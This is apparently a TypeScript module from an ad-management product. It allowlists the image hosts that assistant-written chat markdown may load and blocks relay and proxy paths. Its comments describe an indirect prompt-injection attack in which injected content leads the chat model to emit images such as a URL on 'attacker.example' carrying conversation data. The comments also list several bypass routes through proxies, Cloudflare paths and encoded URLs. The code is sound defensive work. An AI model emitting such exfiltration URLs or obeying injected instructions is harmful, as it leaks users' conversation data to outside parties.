import { defaultUrlTransform, type UrlTransform } from "react-markdown";

/**
 * Host gate for images rendered from assistant-authored chat markdown (SEC-012, ADM-10870).
 *
 * The chat model's context carries untrusted text — scraped competitor ad copy, customer
 * messages, tool output from third-party APIs. An indirect prompt injection in any of it can
 * make the assistant emit `![](https://attacker.example/p.png?d=<conversation data>)`. The
 * browser fetches that the moment the message paints, with no user interaction, so the image
 * URL becomes a zero-click exfiltration channel for whatever the model encodes into it.
 *
 * Chat only ever needs to display AdManage-owned media, so image sources are gated on an
 * explicit host allowlist rather than sanitized heuristically: a denylist of "bad" URL shapes
 * will always lose to a URL the attacker gets to author.
 */

/**
 * Media/CDN hosts serving AdManage-owned chat imagery. Exact matches only — no suffix matching,
 * because `endsWith("admanage.ai")` would also accept `evil-admanage.ai`.
 *
 * The application's own origin is deliberately absent. AdManage serves several first-party image
 * relays that re-fetch a caller-supplied `url`: `/api/img-proxy` accepts any public host with no
 * authentication at all, and `/api/manage/proxy-thumbnail` applies no host restriction. Allowing
 * the app origin would let an injected `![](/api/img-proxy?url=https://attacker/?d=<data>)` reopen
 * the exact channel this gate exists to close. Restricting the allowlist to pure media hosts shuts
 * that off by construction, instead of by enumerating relay endpoints that would drift out of date.
 */
const ADMANAGE_MEDIA_HOSTS: readonly string[] = [
  "media.admanage.ai",
  "ugc.admanage.ai",
  "files.admanage.app",
  "files.adscan.ai",
  // The host AdScan's current upload pipeline returns (adscan store-images and the extension
  // uploader both mint `https://media.adscan.ai/<key>`); `files.adscan.ai` is the older bucket.
  "media.adscan.ai",
];

/**
 * Registrable domains of the ad platforms' own creative CDNs, matched on a dot boundary so only
 * their real subdomains qualify (`scontent-lhr8-1.xx.fbcdn.net`, `p16-sign-va.tiktokcdn.com`).
 *
 * These are safe to render even though we do not own them, because the exfiltration channel needs
 * the attacker to *observe* the request. Nobody can register a name under `fbcdn.net` or
 * `tiktokcdn.com`, so an injected URL pointed at one of these hosts reaches a server the attacker
 * cannot read. Shared-tenant CDNs where an attacker could obtain a subdomain (`akamaized.net`,
 * `cloudfront.net`, and friends) are deliberately excluded for exactly that reason — and so is
 * `tiktok.com` itself, which serves user-controlled pages rather than creative assets.
 *
 * Meta's `external*.xx.fbcdn.net` fetch-and-cache endpoint takes its target as a `?url=` parameter;
 * that stays blocked by the embedded-relay-target check every policy applies.
 */
const AD_PLATFORM_CREATIVE_CDN_DOMAINS: readonly string[] = [
  "fbcdn.net",
  "tiktokcdn.com",
  "tiktokcdn-us.com",
  "tiktokcdn-eu.com",
  "tiktokcdn-in.com",
  "ibyteimg.com",
  "ibytedtos.com",
  "byteoversea.com",
];

/**
 * Which hosts a given rendering surface may auto-fetch images from.
 *
 * `exactHosts` are compared verbatim; `suffixDomains` also match their subdomains on a dot
 * boundary. Surfaces differ because their models differ: the main chat assistant never emits
 * markdown images at all, while the reports assistant is explicitly instructed to render each ad's
 * `thumbnail_url`, which for TikTok accounts is a URL the platform minted on its own CDN.
 */
export interface AssistantImageHostPolicy {
  readonly exactHosts: ReadonlySet<string>;
  readonly suffixDomains: readonly string[];
}

function buildPolicy(exactHosts: readonly string[], suffixDomains: readonly string[]): AssistantImageHostPolicy {
  return { exactHosts: new Set(exactHosts), suffixDomains };
}

/**
 * Default policy: AdManage-owned media hosts only.
 *
 * Correct for every surface whose model produces prose. `lib/chat/system-prompt.ts` tells the main
 * chat assistant that no image is ever attached to a tool result, and the automation / commentary /
 * spend-analysis prompts never mention images either, so a markdown image on those surfaces is by
 * definition not something we asked for.
 */
export const CHAT_ASSISTANT_IMAGE_POLICY: AssistantImageHostPolicy = buildPolicy(ADMANAGE_MEDIA_HOSTS, []);

/**
 * Reports policy: AdManage media hosts plus the ad platforms' creative CDNs.
 *
 * `app/api/reports-chat/route.ts` instructs the model to render `![ad name](thumbnail_url)` for
 * every row. On Meta accounts the route rewrites that column to `files.admanage.app` server-side,
 * so the default policy already covers it; on TikTok accounts `tiktok-report.ts` passes the
 * platform's own CDN URL straight through, and the default policy would blank every thumbnail.
 */
export const REPORT_ASSISTANT_IMAGE_POLICY: AssistantImageHostPolicy = buildPolicy(
  ADMANAGE_MEDIA_HOSTS,
  AD_PLATFORM_CREATIVE_CDN_DOMAINS,
);

/**
 * Chat tool-card policy: AdManage media hosts plus the ad platforms' creative CDNs
 * (SEC-012c, ADM-10939).
 *
 * Tool cards mount inline the moment a call reports `done`, so any URL they hand to an `<img>` is
 * auto-fetched with no user interaction. Reference-image URLs reach those cards through the tool
 * call's `args`, which the model authors, so an indirect prompt injection can steer one at a host
 * the attacker watches — the same zero-click channel this module closes for markdown.
 *
 * The host set matches {@link REPORT_ASSISTANT_IMAGE_POLICY} rather than the stricter chat default,
 * because AdScan carousel picks are a first-class reference source and their creatives live on
 * `scontent-*.xx.fbcdn.net`. It is built from the same two lists rather than aliased so the two
 * surfaces can diverge without one silently dragging the other along.
 */
export const CHAT_CARD_REFERENCE_IMAGE_POLICY: AssistantImageHostPolicy = buildPolicy(
  ADMANAGE_MEDIA_HOSTS,
  AD_PLATFORM_CREATIVE_CDN_DOMAINS,
);

/**
 * Dot-boundary suffix match. `hostname.endsWith("fbcdn.net")` alone would also accept
 * `attacker-fbcdn.net`, which anyone can register.
 */
function matchesPolicy(hostname: string, policy: AssistantImageHostPolicy): boolean {
  if (policy.exactHosts.has(hostname)) return true;
  return policy.suffixDomains.some((domain) => hostname === domain || hostname.endsWith(`.${domain}`));
}

/**
 * Sources must be written as explicit absolute `https://` URLs. Relative (`/x.png`),
 * protocol-relative (`//host/x.png`) and scheme-relative (`https:host/x.png`) forms all resolve
 * against the document, which lands them back on the application origin and its relays, so they
 * are refused rather than resolved. Requiring an absolute URL also removes any chance of this
 * gate's parsing disagreeing with the browser's.
 */
const ABSOLUTE_HTTPS_URL_PATTERN = /^https:\/\//i;

/**
 * Cloudflare's reserved path prefix on our own zones. `/cdn-cgi/image/<options>/<source>` is the
 * image-transformation endpoint, and with the zone's "Resize images from any origin" toggle on it
 * becomes, in `adscan/packages/ui/src/lib/adscan-image-url.ts`'s own words, "a public image proxy
 * that ANYONE can point at ANY URL". `files.adscan.ai` and `media.adscan.ai` sit behind that zone,
 * so an allowlisted hostname alone does not prove the request stops there.
 */
const CLOUDFLARE_RESERVED_PATH_PREFIX = "/cdn-cgi/";

/** How many percent-decode passes to apply when looking for a relay target hidden by encoding. */
const MAX_RELAY_TARGET_DECODE_PASSES = 3;

const EMBEDDED_ABSOLUTE_URL_PATTERN = /https?:\/\//i;

/**
 * Detects an allowlisted host being used as a relay: a source URL carrying another absolute URL in
 * its path or query, which is how every image-proxy endpoint takes its target. Checked through
 * repeated percent-decoding so `%68ttps%3A%2F%2F` and friends cannot hide it.
 *
 * Chat media are plain object URLs, so this costs nothing legitimate — and being over-strict here
 * degrades to a placeholder chip, never to data loss.
 */
function hasEmbeddedRelayTarget(parsed: URL): boolean {
  let probe = `${parsed.pathname}${parsed.search}`;

  for (let pass = 0; pass < MAX_RELAY_TARGET_DECODE_PASSES; pass += 1) {
    if (EMBEDDED_ABSOLUTE_URL_PATTERN.test(probe)) return true;

    const decoded = decodePercentEscapes(probe);
    if (decoded === probe) return false;
    probe = decoded;
  }

  return EMBEDDED_ABSOLUTE_URL_PATTERN.test(probe);
}

const PERCENT_ESCAPE_PATTERN = /%[0-9a-f]{2}/gi;
const PERCENT_ESCAPE_RADIX = 16;

/**
 * Decodes well-formed `%XX` escapes and leaves everything else alone.
 *
 * `decodeURIComponent` would be the obvious choice, but it throws on a stray `%`, and an object
 * key like `50%_off_hook.jpg` is an ordinary filename — treating that as hostile blocks real media.
 * Skipping only the malformed escapes keeps legitimate names intact while still unmasking a relay
 * target hidden behind encoding (`%68ttps%3A%2F%2F…`), including one padded with junk escapes.
 */
function decodePercentEscapes(value: string): string {
  return value.replace(PERCENT_ESCAPE_PATTERN, (escape) =>
    String.fromCharCode(Number.parseInt(escape.slice(1), PERCENT_ESCAPE_RADIX)),
  );
}

export type AssistantImageBlockReason =
  | "missing"
  | "malformed"
  | "not-absolute-https"
  | "host-not-allowlisted"
  | "relay-path";

export type AssistantImageSource =
  | { readonly kind: "allowed"; readonly src: string }
  | { readonly kind: "blocked"; readonly reason: AssistantImageBlockReason };

/**
 * Decides whether an assistant-authored image URL may be rendered.
 *
 * @param rawSrc - URL exactly as the model emitted it, or `undefined` when markdown carried none.
 * @param policy - Hosts this rendering surface may auto-fetch from. Defaults to the strict
 *   AdManage-media-only policy, so a caller that forgets the argument fails closed.
 * @returns `allowed` with the source to render, or `blocked` with the reason it was refused.
 */
export function resolveAssistantImageSource(
  rawSrc: string | null | undefined,
  policy: AssistantImageHostPolicy = CHAT_ASSISTANT_IMAGE_POLICY,
): AssistantImageSource {
  const candidate = typeof rawSrc === "string" ? rawSrc.trim() : "";
  if (candidate.length === 0) return { kind: "blocked", reason: "missing" };

  if (!ABSOLUTE_HTTPS_URL_PATTERN.test(candidate)) {
    return { kind: "blocked", reason: "not-absolute-https" };
  }

  let parsed: URL;
  try {
    parsed = new URL(candidate);
  } catch {
    return { kind: "blocked", reason: "malformed" };
  }

  // `URL` lowercases the host and punycodes IDN homographs, so a Cyrillic lookalike of
  // `media.admanage.ai` arrives here as `xn--...` and misses the set. Userinfo is parsed off the
  // authority, so `https://media.admanage.ai@attacker/` yields `attacker` as the hostname.
  if (!matchesPolicy(parsed.hostname, policy)) {
    return { kind: "blocked", reason: "host-not-allowlisted" };
  }

  // An allowlisted hostname only proves where the request starts. Media hosts can still relay:
  // Cloudflare's `/cdn-cgi/image/<opts>/<source>` endpoint fetches an arbitrary source URL when the
  // zone's "resize from any origin" toggle is on, which would restore the exfiltration channel from
  // inside the allowlist.
  if (parsed.pathname.toLowerCase().startsWith(CLOUDFLARE_RESERVED_PATH_PREFIX)) {
    return { kind: "blocked", reason: "relay-path" };
  }
  if (hasEmbeddedRelayTarget(parsed)) {
    return { kind: "blocked", reason: "relay-path" };
  }

  return { kind: "allowed", src: candidate };
}

/**
 * Markdown property names the browser fetches on its own once the element paints. Only `src` can
 * reach this from markdown + remark-gfm today; `srcSet` and `poster` are carried as a deliberate
 * superset so that adding a rehype plugin later cannot quietly open an ungated auto-fetch.
 */
const AUTO_FETCHED_MARKDOWN_URL_KEYS: ReadonlySet<string> = new Set(["src", "srcSet", "poster"]);

/**
 * Builds react-markdown's own sanitization hook, applied to every URL-bearing property before any
 * element reaches the DOM.
 *
 * Returns `undefined` rather than `""` for a refused source, because browsers resolve an empty
 * `src` to the current document and still issue a request. `href` keeps react-markdown's default
 * protocol sanitizer, since links are click-gated and the assistant legitimately links off-site.
 */
export function createAssistantMarkdownUrlTransform(
  policy: AssistantImageHostPolicy = CHAT_ASSISTANT_IMAGE_POLICY,
): UrlTransform {
  return (url, key) => {
    if (!AUTO_FETCHED_MARKDOWN_URL_KEYS.has(key)) return defaultUrlTransform(url);
    const source = resolveAssistantImageSource(url, policy);
    return source.kind === "allowed" ? source.src : undefined;
  };
}

/** `urlTransform` for surfaces whose assistant only ever produces prose. */
export const transformAssistantMarkdownUrl: UrlTransform =
  createAssistantMarkdownUrlTransform(CHAT_ASSISTANT_IMAGE_POLICY);
